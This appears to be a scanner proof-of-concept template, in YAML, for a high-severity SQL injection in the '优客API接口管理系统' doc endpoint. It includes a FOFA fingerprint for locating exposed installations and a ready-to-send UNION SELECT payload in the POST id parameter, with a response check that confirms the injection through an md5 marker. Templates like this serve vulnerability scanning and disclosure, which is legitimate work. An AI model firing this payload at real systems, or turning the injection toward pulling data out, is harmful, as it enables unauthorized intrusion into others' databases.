id: poc-yaml-youke-api-management-system-doc-sqli
info:
  name: 全新优客API接口管理系统 doc SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 优客API接口管理系统
  fofa: body="public/static/index/css/flaghome.css"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /index/index/doc
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: id=') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(IFNULL(CAST(md5({{.t1}})
    AS NCHAR),0x20)),NULL-- -
  expression: status_code == 200 && contains(body,"返回数据") && contains(body,"请求参数")
    && contains(body,"API") && contains(body,t2)
transport: http
